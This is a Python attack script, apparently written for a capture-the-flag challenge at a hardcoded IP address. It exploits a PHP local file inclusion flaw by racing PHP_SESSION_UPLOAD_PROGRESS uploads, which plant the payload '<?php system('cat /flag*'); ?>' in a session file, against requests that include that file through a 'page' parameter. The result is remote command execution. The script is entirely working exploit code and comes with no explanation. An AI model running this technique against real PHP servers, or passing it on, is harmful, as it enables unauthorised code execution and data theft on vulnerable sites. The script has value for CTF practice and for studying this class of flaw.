#!/usr/bin/env python3
"""
Session Upload Progress RCE
利用条件竞争包含临时session文件
"""

import requests
import threading
import sys
import re

# 目标 URL
url = "http://47.113.178.182:32827/"
# Session 文件名 (我们可以自定义)
sess_id = "flag_hunt"
sess_file = f"/tmp/sess_{sess_id}"

# Payload: 这里的代码会被写入 session 文件
payload = "<?php system('cat /flag*'); ?>"

found_flag = False

def write_session():
    """不断写入session文件"""
    while not found_flag:
        try:
            # 上传文件时附带 PHP_SESSION_UPLOAD_PROGRESS
            files = {'file': ('a.txt', 'test')}
            data = {'PHP_SESSION_UPLOAD_PROGRESS': payload}
            cookies = {'PHPSESSID': sess_id}
            requests.post(url, files=files, data=data, cookies=cookies, timeout=3)
        except:
            pass

def read_session():
    """不断尝试读取session文件"""
    global found_flag
    while not found_flag:
        try:
            r = requests.get(f"{url}?page={sess_file}", timeout=3)

            # 检查是否包含flag
            if 'flagTOGOGO{' in r.text:
                found_flag = True
                print("\n" + "="*70)
                print("[+] Success! Found Flag:")
                print("="*70)

                # 提取flag
                flags = re.findall(r'flagTOGOGO\{[^}]+\}', r.text)
                if flags:
                    print(f"\n[FLAG] {flags[0]}\n")
                else:
                    # 打印包含flag的部分
                    lines = r.text.split('\n')
                    for i, line in enumerate(lines):
                        if 'flag' in line.lower():
                            start = max(0, i-2)
                            end = min(len(lines), i+3)
                            print('\n'.join(lines[start:end]))
                            break

                print("="*70)
                sys.exit(0)

        except:
            pass

print("[*] Starting Session Upload Progress Attack...")
print("[*] Target: " + url)
print("[*] Session file: " + sess_file)
print("[*] Threads: 5 Write / 5 Read")
print("[*] Press Ctrl+C to stop\n")

# 启动写入线程
for _ in range(5):
    t = threading.Thread(target=write_session)
    t.daemon = True
    t.start()

# 启动读取线程
for _ in range(5):
    t = threading.Thread(target=read_session)
    t.daemon = True
    t.start()

# 保持主线程运行
try:
    import time
    counter = 0
    while not found_flag:
        time.sleep(1)
        counter += 1
        if counter % 5 == 0:
            print(f"[*] Running for {counter} seconds...")

except KeyboardInterrupt:
    print("\n[!] Stopping...")
    sys.exit(1)
